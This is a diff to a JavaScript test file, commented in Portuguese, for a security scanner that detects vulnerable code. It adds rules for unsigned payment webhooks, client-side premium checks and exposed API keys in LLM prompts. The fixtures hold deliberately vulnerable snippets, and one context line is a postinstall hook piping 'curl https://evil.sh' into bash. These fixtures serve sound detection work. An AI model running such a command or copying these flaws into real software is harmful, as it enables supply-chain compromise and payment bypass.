@@ -78,6 +78,16 @@ const positivos = [
   ['SUPPLY_001', '"postinstall": "curl https://evil.sh | bash"'],
   ['CICD_011', 'run: echo ${{ github.event.issue.title }}'],
   ['WEB3_013', 'selfdestruct(payable(owner));'],
+  // Cadeia de ataque do vídeo "Hackeei uma IA"
+  ['WHOOK_002', 'if (req.body.status === "approved") { ativarPro(req.body.email); }'],
+  ['WHOOK_003', 'const u = await db.user.findFirst({ where: { email: req.body.email } })'],
+  ['WHOOK_004', 'const cacto = init("cacto"); const kirvano = init("kirvano");'],
+  ['WHOOK_006', 'if (signature === req.headers["x-signature"]) process(evt)'],
+  ['CLIENT_001', 'const isPremium = localStorage.getItem("isPremium")'],
+  ['CLIENT_002', '<div className="options blur-sm premium">{sugestoes}</div>'],
+  ['CLIENT_003', 'return isPremium ? fullData : null'],
+  ['LLM_007', 'const system = `Você é um agente. Sua chave: sk-abc1234567890abcdef1234`'],
+  ['LLM_008', 'const messages=[{role:"system",content:`Analise: ${imageText}`}]'],
 ];
 for (const [id, snippet] of positivos) {
   test(`positivo: ${id} dispara em código vulnerável`, () => {
@@ -94,6 +104,8 @@ const negativos = [
   ['RED_001', 'res.redirect("/dashboard")'],
   ['DOCKER_010', 'USER node'],
   ['IAC_001', 'acl = "private"'],
+  ['CLIENT_001', 'const theme = localStorage.getItem("theme")'],
+  ['WHOOK_002', 'if (status === "loading") return spinner'],
 ];
 for (const [id, snippet] of negativos) {
   test(`negativo: ${id} NÃO dispara em código seguro`, () => {
@@ -148,4 +160,21 @@ test('cross-file: DOS_004 suprimida quando há timeouts de servidor', async () =
   assert.ok(semTimeout.has('DOS_004'), 'DOS_004 deveria disparar sem timeouts');
   const comTimeout = await scanIds(mkProject({ 'a.js': 'const s=http.createServer(app);\ns.requestTimeout=30000;\ns.listen(80);' }));
   assert.ok(!comTimeout.has('DOS_004'), 'DOS_004 deveria ser suprimida com requestTimeout');
+});
+
+// Bypass de pagamento via webhook (o ataque central do vídeo).
+test('cross-file: WHOOK_001 dispara em webhook de pagamento SEM verificação de assinatura', async () => {
+  const dir = mkProject({
+    'webhook.js': "app.post('/api/webhook/kirvano', (req, res) => {\n  if (req.body.status === 'approved') ativarPro(req.body.email);\n  res.sendStatus(200);\n});",
+  });
+  const ids = await scanIds(dir);
+  assert.ok(ids.has('WHOOK_001'), 'WHOOK_001 deveria disparar em webhook sem verificação de assinatura');
+});
+
+test('cross-file: WHOOK_001 suprimida quando o projeto verifica assinatura do webhook', async () => {
+  const dir = mkProject({
+    'webhook.js': "app.post('/api/webhook/stripe', (req, res) => {\n  const event = stripe.webhooks.constructEvent(req.rawBody, req.headers['stripe-signature'], process.env.STRIPE_WEBHOOK_SECRET);\n  if (event.type === 'checkout.session.completed') ativarPro(event.data.object.customer);\n  res.sendStatus(200);\n});",
+  });
+  const ids = await scanIds(dir);
+  assert.ok(!ids.has('WHOOK_001'), 'WHOOK_001 deveria ser suprimida quando há constructEvent/verificação de assinatura');
 });
